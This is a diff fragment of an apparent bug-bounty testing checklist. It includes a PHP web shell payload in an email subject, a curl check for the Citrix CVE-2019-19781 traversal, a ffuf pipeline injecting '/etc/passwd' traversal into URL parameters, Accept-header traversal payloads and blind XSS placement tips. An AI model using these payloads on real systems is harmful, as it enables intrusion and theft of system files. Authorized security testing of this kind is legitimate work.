@@ -30,8 +30,8 @@ subject: <?php system($_GET['c']);?>
 - [ ] Check email verification `admin@target.com`
 - [ ] `target.com/home/....4....json` (Will disclose all the content of the home dir + sensitive info)
 - [ ] `CVE-2019-19781`: Citrix NetScaler Directory Traversal: `curl -vk -path-as-is https://$TARGET/vpn/../vpns/ 2>&1 | grep "You don't have permission to access /vpns/" >/dev/null && echo "VULNERABLE: $TARGET" || echo "MITIGATED: $TARGET"`
-- [ ] We can look for vulnerabilities such as SQLi, Path Traversal: `cat urls.txt | grep "?" | qsreplace ../../../../etc/passwd | ffuf -u 'FUZZ' -w - -mr '^root:'
-`
+- [ ] We can look for vulnerabilities such as SQLi, Path Traversal: `cat urls.txt | grep "?" | qsreplace ../../../../etc/passwd | ffuf -u 'FUZZ' -w - -mr '^root:'`
+- [ ] When you test a **Django**, **Rails**, or **NodeJs** web app try the following payloads in the `Accept:` header. (e.g.,`Accept: ../../../../etc/passwd`)
 ### Blind XSS
 - [ ] Blind XSS Payload in `User-Agent` header
 - [ ] BXSS payload while logging (Enter the BXSS payload in forget pass, login, signup to generate errors)
